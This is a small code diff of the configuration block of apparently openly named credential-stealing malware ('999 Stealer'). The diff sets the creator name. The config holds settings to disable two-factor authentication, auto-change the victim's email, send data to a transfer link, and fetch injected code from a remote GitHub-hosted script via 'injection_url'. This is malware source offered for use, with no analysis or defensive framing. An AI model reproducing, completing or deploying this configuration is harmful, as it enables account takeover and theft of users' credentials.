@@ -20,7 +20,7 @@ var config = {
   disable2FA: "%DISABLEFA%",
   changeMailAuto: "DISABLED!!!",//%AUTOMAILCHANGER%
   mail: "%CLIENTEMAIL%",
-  creator: "%NAME_CREATOR%",
+  creator: "999 Stealer",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
     "https://raw.githubusercontent.com/familigy/sub/main/index.js",
